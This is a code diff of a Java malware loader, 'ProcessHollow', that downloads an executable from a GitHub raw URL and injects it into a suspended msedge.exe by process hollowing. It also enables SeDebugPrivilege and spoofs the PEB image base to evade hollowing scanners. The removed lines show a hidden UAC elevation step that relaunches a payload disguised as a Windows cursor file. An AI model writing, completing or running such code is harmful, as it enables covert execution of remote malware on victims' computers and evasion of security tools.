@@ -8,45 +8,26 @@ import java.io.*;
 
 public class ProcessHollow {
 
-    // Memory Protection Constants
-    // PAGE_READONLY = 0x02
-    // PAGE_READWRITE = 0x04
-    // PAGE_EXECUTE_READ = 0x20
-    // PAGE_EXECUTE_READWRITE = 0x40
-    
     static MethodHandle createProcess;
     static MethodHandle virtualAllocEx;
     static MethodHandle virtualProtectEx;
     static MethodHandle writeProcessMemory;
-    static MethodHandle readProcessMemory;
     static MethodHandle zwUnmapViewOfSection;
     static MethodHandle setThreadContext;
     static MethodHandle getThreadContext;
     static MethodHandle resumeThread;
     static MethodHandle closeHandle;
-    static MethodHandle sleep;
     static MethodHandle openProcessToken;
     static MethodHandle lookupPrivilegeValue;
     static MethodHandle adjustTokenPrivileges;
     static MethodHandle getCurrentProcess;
-    static MethodHandle shellExecuteEx;
-    static MethodHandle isUserAnAdmin;
 
     static {
         try {
             Linker linker = Linker.nativeLinker();
             SymbolLookup kernel32 = SymbolLookup.libraryLookup("kernel32", Arena.global());
-            SymbolLookup ntdll = SymbolLookup.libraryLookup("ntdll", Arena.global());
+            SymbolLookup ntdll    = SymbolLookup.libraryLookup("ntdll",    Arena.global());
             SymbolLookup advapi32 = SymbolLookup.libraryLookup("advapi32", Arena.global());
-            SymbolLookup shell32 = SymbolLookup.libraryLookup("shell32", Arena.global());
-
-            isUserAnAdmin = linker.downcallHandle(
-                shell32.find("IsUserAnAdmin").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.JAVA_INT));
-
-            shellExecuteEx = linker.downcallHandle(
-                shell32.find("ShellExecuteExW").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
 
             createProcess = linker.downcallHandle(
                 kernel32.find("CreateProcessW").orElseThrow(),
@@ -73,12 +54,6 @@ public class ProcessHollow {
                     ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.ADDRESS,
                     ValueLayout.JAVA_LONG, ValueLayout.ADDRESS));
 
-            readProcessMemory = linker.downcallHandle(
-                kernel32.find("ReadProcessMemory").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.JAVA_INT,
-                    ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.ADDRESS,
-                    ValueLayout.JAVA_LONG, ValueLayout.ADDRESS));
-
             zwUnmapViewOfSection = linker.downcallHandle(
                 ntdll.find("ZwUnmapViewOfSection").orElseThrow(),
                 FunctionDescriptor.of(ValueLayout.JAVA_INT,
@@ -97,10 +72,6 @@ public class ProcessHollow {
             resumeThread = linker.downcallHandle(
                 kernel32.find("ResumeThread").orElseThrow(),
                 FunctionDescriptor.of(ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
-
-            sleep = linker.downcallHandle(
-                kernel32.find("Sleep").orElseThrow(),
-                FunctionDescriptor.ofVoid(ValueLayout.JAVA_INT));
 
             getCurrentProcess = linker.downcallHandle(
                 kernel32.find("GetCurrentProcess").orElseThrow(),
@@ -125,272 +96,162 @@ public class ProcessHollow {
             closeHandle = linker.downcallHandle(
                 kernel32.find("CloseHandle").orElseThrow(),
                 FunctionDescriptor.of(ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
+
         } catch (Throwable t) {
             throw new RuntimeException(t);
         }
     }
 
-    public static void Load(byte[] buffer, String host, String args) throws Throwable {
+    public static void Load(byte[] buffer, String host) throws Throwable {
         try (Arena arena = Arena.ofConfined()) {
             ByteBuffer bb = ByteBuffer.wrap(buffer).order(ByteOrder.LITTLE_ENDIAN);
 
-            int e_lfanew = bb.getInt(0x3C);
-            int sizeOfImage = bb.getInt(e_lfanew + 0x18 + 0x38);
-            int sizeOfHeaders = bb.getInt(e_lfanew + 0x18 + 0x3C);
-            int entryPoint = bb.getInt(e_lfanew + 0x18 + 0x10);
+            int   e_lfanew         = bb.getInt(0x3C);
+            int   sizeOfImage      = bb.getInt(e_lfanew + 0x18 + 0x38);
+            int   sizeOfHeaders    = bb.getInt(e_lfanew + 0x18 + 0x3C);
+            int   entryPoint       = bb.getInt(e_lfanew + 0x18 + 0x10);
             short numberOfSections = bb.getShort(e_lfanew + 0x4 + 0x2);
-            short sizeOfOptionalHeader = bb.getShort(e_lfanew + 0x4 + 0x10);
-            long imageBase = bb.getLong(e_lfanew + 0x18 + 0x18);
+            short sizeOfOptHdr     = bb.getShort(e_lfanew + 0x4 + 0x10);
+            long  imageBase        = bb.getLong(e_lfanew + 0x18 + 0x18);
 
-            MemorySegment pThreadContext = arena.allocate(0x4d0);
+            MemorySegment si = arena.allocate(0x68);
+            si.set(ValueLayout.JAVA_INT, 0, 0x68);
+            MemorySegment pi = arena.allocate(0x18);
 
-            String targetHost = host;
-            if (args != null && !args.isEmpty()) targetHost += " " + args;
-            String currentDirectory = System.getProperty("user.dir");
+            byte[] cmdBytes = (host + "\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
+            MemorySegment cmdSeg = arena.allocate(cmdBytes.length);
+            cmdSeg.copyFrom(MemorySegment.ofArray(cmdBytes));
 
-            pThreadContext.set(ValueLayout.JAVA_INT, 0x30, 0x0010001B);
+            int ok = (int) createProcess.invokeExact(
+                MemorySegment.NULL, cmdSeg,
+                MemorySegment.NULL, MemorySegment.NULL,
+                false, 0x00000004 | 0x08000000,
+                MemorySegment.NULL, MemorySegment.NULL,
+                si, pi);
 
-            MemorySegment bStartupInfo = arena.allocate(0x68);
-            MemorySegment bProcessInfo = arena.allocate(0x18);
-            bStartupInfo.set(ValueLayout.JAVA_INT, 0, 0x68);
+            if (ok == 0) return;
 
-            byte[] targetHostBytes = ("\"" + targetHost + "\"\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
-            MemorySegment targetHostSeg = arena.allocate(targetHostBytes.length);
-            targetHostSeg.copyFrom(MemorySegment.ofArray(targetHostBytes));
+            MemorySegment hProcess = MemorySegment.ofAddress(pi.get(ValueLayout.JAVA_LONG, 0x0));
+            MemorySegment hThread  = MemorySegment.ofAddress(pi.get(ValueLayout.JAVA_LONG, 0x8));
 
-            byte[] currentDirBytes = (currentDirectory + "\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
-            MemorySegment currentDirSeg = arena.allocate(currentDirBytes.length);
-            currentDirSeg.copyFrom(MemorySegment.ofArray(currentDirBytes));
+            int unmap = (int) zwUnmapViewOfSection.invokeExact(hProcess, MemorySegment.ofAddress(imageBase));
 
-            // CREATE_SUSPENDED = 0x00000004, CREATE_NO_WINDOW = 0x08000000
-            int creationFlags = 0x00000004 | 0x08000000;
-            
-            int success = (int) createProcess.invokeExact(
-                MemorySegment.NULL, targetHostSeg, MemorySegment.NULL, MemorySegment.NULL,
-                true, creationFlags, MemorySegment.NULL, currentDirSeg, bStartupInfo, bProcessInfo);
+            MemorySegment remote = (MemorySegment) virtualAllocEx.invokeExact(
+                hProcess, MemorySegment.ofAddress(imageBase),
+                (long) sizeOfImage, 0x3000, 0x04);
+            if (remote.address() == 0) return;
 
-            if (success == 0) return;
-
-            long processHandle = bProcessInfo.get(ValueLayout.JAVA_LONG, 0x0);
-            long threadHandle = bProcessInfo.get(ValueLayout.JAVA_LONG, 0x8);
-
-            MemorySegment hProcess = MemorySegment.ofAddress(processHandle);
-            MemorySegment hThread = MemorySegment.ofAddress(threadHandle);
-            MemorySegment imageBaseSeg = MemorySegment.ofAddress(imageBase);
-
-            int unmapResult = (int) zwUnmapViewOfSection.invokeExact(hProcess, imageBaseSeg);
-
-            // Aloca memória com RW primeiro (não RWX!)
-            MemorySegment remoteAddr = (MemorySegment) virtualAllocEx.invokeExact(
-                hProcess, imageBaseSeg, (long) sizeOfImage, 0x3000, 0x04); // PAGE_READWRITE
-            long remoteAddrLong = remoteAddr.address();
-
-            if (remoteAddrLong == 0) return;
-
-            MemorySegment headerSeg = arena.allocate(sizeOfHeaders);
-            headerSeg.copyFrom(MemorySegment.ofArray(Arrays.copyOf(buffer, sizeOfHeaders)));
-            int w1 = (int) writeProcessMemory.invokeExact(
-                hProcess, imageBaseSeg, headerSeg, (long) sizeOfHeaders, MemorySegment.NULL);
+            MemorySegment hdrSeg = arena.allocate(sizeOfHeaders);
+            hdrSeg.copyFrom(MemorySegment.ofArray(Arrays.copyOf(buffer, sizeOfHeaders)));
+            int w1 = (int) writeProcessMemory.invokeExact(hProcess, MemorySegment.ofAddress(imageBase),
+                hdrSeg, (long) sizeOfHeaders, MemorySegment.NULL);
 
             for (short i = 0; i < numberOfSections; i++) {
-                int secOff = e_lfanew + (0x18 + sizeOfOptionalHeader) + (0x28 * i);
+                int secOff         = e_lfanew + (0x18 + sizeOfOptHdr) + (0x28 * i);
                 int virtualAddress = bb.getInt(secOff + 0x0C);
-                int sizeOfRawData = bb.getInt(secOff + 0x10);
-                int pointerToRawData = bb.getInt(secOff + 0x14);
-
-                if (pointerToRawData + sizeOfRawData > buffer.length || sizeOfRawData <= 0) {
-                    continue;
-                }
-
-                byte[] sectionData = Arrays.copyOfRange(buffer, pointerToRawData, pointerToRawData + sizeOfRawData);
-                MemorySegment sectionSeg = arena.allocate(sectionData.length);
-                sectionSeg.copyFrom(MemorySegment.ofArray(sectionData));
-
-                MemorySegment targetAddr = MemorySegment.ofAddress(imageBase + virtualAddress);
-                int w = (int) writeProcessMemory.invokeExact(
-                    hProcess, targetAddr, sectionSeg, (long) sectionData.length, MemorySegment.NULL);
+                int sizeOfRawData  = bb.getInt(secOff + 0x10);
+                int ptrToRawData   = bb.getInt(secOff + 0x14);
+                if (sizeOfRawData <= 0 || ptrToRawData + sizeOfRawData > buffer.length) continue;
+                byte[] sec = Arrays.copyOfRange(buffer, ptrToRawData, ptrToRawData + sizeOfRawData);
+                MemorySegment secSeg = arena.allocate(sec.length);
+                secSeg.copyFrom(MemorySegment.ofArray(sec));
+                int ws = (int) writeProcessMemory.invokeExact(hProcess,
+                    MemorySegment.ofAddress(imageBase + virtualAddress),
+                    secSeg, (long) sec.length, MemorySegment.NULL);
             }
 
-            int gtc = (int) getThreadContext.invokeExact(hThread, pThreadContext);
-
-            long rdx = pThreadContext.get(ValueLayout.JAVA_LONG, 0x88);
+            MemorySegment ctx = arena.allocate(0x4d0);
+            ctx.set(ValueLayout.JAVA_INT, 0x30, 0x0010001B);
+            int gtc = (int) getThreadContext.invokeExact(hThread, ctx);
+            long rdx = ctx.get(ValueLayout.JAVA_LONG, 0x88);
 
             if (rdx != 0) {
-                MemorySegment imageBaseBytes = arena.allocate(8);
-                imageBaseBytes.set(ValueLayout.JAVA_LONG, 0, imageBase);
-                int w = (int) writeProcessMemory.invokeExact(
-                    hProcess, MemorySegment.ofAddress(rdx + 16), imageBaseBytes, 8L, MemorySegment.NULL);
+                MemorySegment ibSeg = arena.allocate(8);
+                ibSeg.set(ValueLayout.JAVA_LONG, 0, imageBase);
+                int wpeb = (int) writeProcessMemory.invokeExact(hProcess,
+                    MemorySegment.ofAddress(rdx + 16), ibSeg, 8L, MemorySegment.NULL);
             }
 
-            long newEntryPoint = imageBase + entryPoint;
-            pThreadContext.set(ValueLayout.JAVA_LONG, 0x80, newEntryPoint);
+            ctx.set(ValueLayout.JAVA_LONG, 0x80, imageBase + entryPoint);
+            int stc = (int) setThreadContext.invokeExact(hThread, ctx);
 
-            int stc = (int) setThreadContext.invokeExact(hThread, pThreadContext);
-
-            // STAGE 4: Section Protection (Bypass Technique)
-            MemorySegment oldProtect = arena.allocate(ValueLayout.JAVA_INT);
-            
-            // Define proteções específicas por seção (sem READ-ONLY global primeiro)
+            MemorySegment oldProt = arena.allocate(ValueLayout.JAVA_INT);
             for (short i = 0; i < numberOfSections; i++) {
-                int secOff = e_lfanew + (0x18 + sizeOfOptionalHeader) + (0x28 * i);
-                int virtualAddress = bb.getInt(secOff + 0x0C);
-                int virtualSize = bb.getInt(secOff + 0x08);
+                int secOff          = e_lfanew + (0x18 + sizeOfOptHdr) + (0x28 * i);
+                int virtualAddress  = bb.getInt(secOff + 0x0C);
+                int virtualSize     = bb.getInt(secOff + 0x08);
                 int characteristics = bb.getInt(secOff + 0x24);
-                
-                int protection = 0x02; // PAGE_READONLY padrão
-                
-                // IMAGE_SCN_MEM_EXECUTE = 0x20000000
-                // IMAGE_SCN_MEM_WRITE = 0x80000000
-                if ((characteristics & 0x20000000) != 0) {
-                    protection = 0x20; // PAGE_EXECUTE_READ
-                } else if ((characteristics & 0x80000000) != 0) {
-                    protection = 0x04; // PAGE_READWRITE
-                }
-                
+                int prot = 0x02;
+                if ((characteristics & 0x20000000) != 0)      prot = 0x20;
+                else if ((characteristics & 0x80000000) != 0) prot = 0x04;
                 try {
-                    MemorySegment sectionBase = MemorySegment.ofAddress(imageBase + virtualAddress);
-                    virtualProtectEx.invokeExact(hProcess, sectionBase, (long)virtualSize, protection, oldProtect);
-                } catch (Throwable t) {
-                }
+                    int vp = (int) virtualProtectEx.invokeExact(hProcess,
+                        MemorySegment.ofAddress(imageBase + virtualAddress),
+                        (long) virtualSize, prot, oldProt);
+                } catch (Throwable ignored) {}
             }
 
-            // STAGE 5: PEB Spoofing (Critical for Hollow Hunter bypass)
-            long originalImageBase = 0x140000000L; // Base original do msedge.exe
             if (rdx != 0) {
                 try {
-                    MemorySegment originalBaseSeg = arena.allocate(8);
-                    originalBaseSeg.set(ValueLayout.JAVA_LONG, 0, originalImageBase);
-                    writeProcessMemory.invokeExact(
-                        hProcess, MemorySegment.ofAddress(rdx + 16), originalBaseSeg, 8L, MemorySegment.NULL);
-                } catch (Throwable t) {
-                }
+                    MemorySegment origBase = arena.allocate(8);
+                    origBase.set(ValueLayout.JAVA_LONG, 0, 0x140000000L);
+                    int spoof = (int) writeProcessMemory.invokeExact(hProcess,
+                        MemorySegment.ofAddress(rdx + 16), origBase, 8L, MemorySegment.NULL);
+                } catch (Throwable ignored) {}
             }
 
             int rt = (int) resumeThread.invokeExact(hThread);
-            
-            if (rt == -1) {
-                return; // ResumeThread falhou
-            }
-            
+
             System.out.println("Ready..");
-            
-            // Aguarda 2 segundos para garantir que o processo inicializou
             Thread.sleep(2000);
-            
-            // Fecha o Java (e o CMD) - processo injetado continua rodando
             System.exit(0);
         }
     }
 
     public static void main(String[] args) throws Throwable {
         try {
-            // Verifica se está rodando como admin
-            int isAdmin = (int) isUserAnAdmin.invokeExact();
-            
-            if (isAdmin == 0) {
-                // Não é admin, re-executa com UAC
-                try (Arena arena = Arena.ofConfined()) {
-                    // Monta o comando java completo
-                    String javaHome = System.getProperty("java.home");
-                    String javaExe = javaHome + "\\bin\\java.exe";
-                    String curFile = "C:\\Windows\\Cursors\\aero_arrow_rv.cur";
-                    String params = "--source 21 --enable-preview --enable-native-access=ALL-UNNAMED \"" + curFile + "\"";
-                    
-                    // Estrutura SHELLEXECUTEINFOW
-                    MemorySegment shellExecInfo = arena.allocate(0x70);
-                    shellExecInfo.set(ValueLayout.JAVA_INT, 0, 0x70); // cbSize
-                    shellExecInfo.set(ValueLayout.JAVA_INT, 4, 0x00000040); // fMask = SEE_MASK_NOCLOSEPROCESS
-                    shellExecInfo.set(ValueLayout.ADDRESS, 0x08, MemorySegment.NULL); // hwnd
-                    
-                    // lpVerb = "runas"
-                    String verb = "runas\0";
-                    byte[] verbBytes = verb.getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
-                    MemorySegment verbSeg = arena.allocate(verbBytes.length);
-                    verbSeg.copyFrom(MemorySegment.ofArray(verbBytes));
-                    shellExecInfo.set(ValueLayout.ADDRESS, 0x10, verbSeg);
-                    
-                    // lpFile = java.exe
-                    byte[] fileBytes = (javaExe + "\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
-                    MemorySegment fileSeg = arena.allocate(fileBytes.length);
-                    fileSeg.copyFrom(MemorySegment.ofArray(fileBytes));
-                    shellExecInfo.set(ValueLayout.ADDRESS, 0x18, fileSeg);
-                    
-                    // lpParameters = argumentos
-                    byte[] paramBytes = (params + "\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
-                    MemorySegment paramSeg = arena.allocate(paramBytes.length);
-                    paramSeg.copyFrom(MemorySegment.ofArray(paramBytes));
-                    shellExecInfo.set(ValueLayout.ADDRESS, 0x20, paramSeg);
-                    
-                    shellExecInfo.set(ValueLayout.ADDRESS, 0x28, MemorySegment.NULL); // lpDirectory
-                    shellExecInfo.set(ValueLayout.JAVA_INT, 0x30, 0); // nShow = SW_HIDE
-                    
-                    int result = (int) shellExecuteEx.invokeExact(shellExecInfo);
-                    
-                    // Sai do processo não-elevado
-                    System.exit(0);
-                }
-                return;
-            }
-            
-            // Está como admin, continua normalmente
             enableDebugPrivilege();
-            
-            String url = "https://github.com/hugoleitevitor-cyber/aaaaaaaaaaaaaaa/raw/refs/heads/main/MixCodes.exe";
-            String file = "C:\\Program Files\\Rockstar Games\\Launcher\\LauncherPatcher.exe";
 
-            byte[] data = downloadFileAsync(url);
-            Load(data, file, "");
-        } catch (Exception e) {
+            String url  = "https://github.com/hugoleitevitor-cyber/aaaaaaaaaaaaaaa/raw/refs/heads/main/MixCodes.exe";
+            String file = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
+
+            byte[] payload = downloadFile(url);
+            Load(payload, file);
+        } catch (Throwable t) {
         }
     }
 
     static void enableDebugPrivilege() {
         try (Arena arena = Arena.ofConfined()) {
-            // TOKEN_ADJUST_PRIVILEGES = 0x0020, TOKEN_QUERY = 0x0008, TOKEN_DUPLICATE = 0x0002
             MemorySegment hToken = arena.allocate(ValueLayout.ADDRESS);
-            MemorySegment hProcess = (MemorySegment) getCurrentProcess.invokeExact();
-            
-            int result = (int) openProcessToken.invokeExact(hProcess, 0x002A, hToken);
-            if (result == 0) return;
-            
-            MemorySegment tokenHandle = hToken.get(ValueLayout.ADDRESS, 0);
-            
-            // Ativa SeDebugPrivilege
-            String privName = "SeDebugPrivilege\0";
-            byte[] privBytes = privName.getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
-            MemorySegment privNameSeg = arena.allocate(privBytes.length);
-            privNameSeg.copyFrom(MemorySegment.ofArray(privBytes));
-            
+            MemorySegment hProc  = (MemorySegment) getCurrentProcess.invokeExact();
+            if ((int) openProcessToken.invokeExact(hProc, 0x0028, hToken) == 0) return;
+            MemorySegment tok = hToken.get(ValueLayout.ADDRESS, 0);
+            byte[] nameB = ("SeDebugPrivilege\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
+            MemorySegment nameSeg = arena.allocate(nameB.length);
+            nameSeg.copyFrom(MemorySegment.ofArray(nameB));
             MemorySegment luid = arena.allocate(8);
-            int lookupResult = (int) lookupPrivilegeValue.invokeExact(MemorySegment.NULL, privNameSeg, luid);
-            
-            if (lookupResult != 0) {
+            if ((int) lookupPrivilegeValue.invokeExact(MemorySegment.NULL, nameSeg, luid) != 0) {
                 MemorySegment tp = arena.allocate(16);
-                tp.set(ValueLayout.JAVA_INT, 0, 1);
-                tp.set(ValueLayout.JAVA_LONG, 4, luid.get(ValueLayout.JAVA_LONG, 0));
-                tp.set(ValueLayout.JAVA_INT, 12, 0x00000002); // SE_PRIVILEGE_ENABLED
-                
-                adjustTokenPrivileges.invokeExact(tokenHandle, 0, tp, 0, MemorySegment.NULL, MemorySegment.NULL);
+                tp.set(ValueLayout.JAVA_INT,  0,  1);
+                tp.set(ValueLayout.JAVA_LONG, 4,  luid.get(ValueLayout.JAVA_LONG, 0));
+                tp.set(ValueLayout.JAVA_INT,  12, 0x00000002);
+                int adj = (int) adjustTokenPrivileges.invokeExact(tok, 0, tp, 0, MemorySegment.NULL, MemorySegment.NULL);
             }
-            
-            closeHandle.invokeExact(tokenHandle);
-        } catch (Throwable t) {
-        }
+            int ch = (int) closeHandle.invokeExact(tok);
+        } catch (Throwable ignored) {}
     }
 
-    static byte[] downloadFileAsync(String url) throws Exception {
+    static byte[] downloadFile(String url) throws Exception {
         HttpClient client = HttpClient.newBuilder()
             .followRedirects(HttpClient.Redirect.NORMAL)
             .build();
-        HttpRequest request = HttpRequest.newBuilder()
+        HttpRequest req = HttpRequest.newBuilder()
             .uri(URI.create(url))
             .header("User-Agent", "Mozilla/5.0")
-            .GET()
-            .build();
-        HttpResponse<byte[]> response = client.send(request, HttpResponse.BodyHandlers.ofByteArray());
-        if (response.statusCode() != 200) {
-            throw new RuntimeException("HTTP " + response.statusCode());
-        }
-        return response.body();
+            .GET().build();
+        HttpResponse<byte[]> resp = client.send(req, HttpResponse.BodyHandlers.ofByteArray());
+        if (resp.statusCode() != 200) throw new RuntimeException("HTTP " + resp.statusCode());
+        return resp.body();
     }
 }
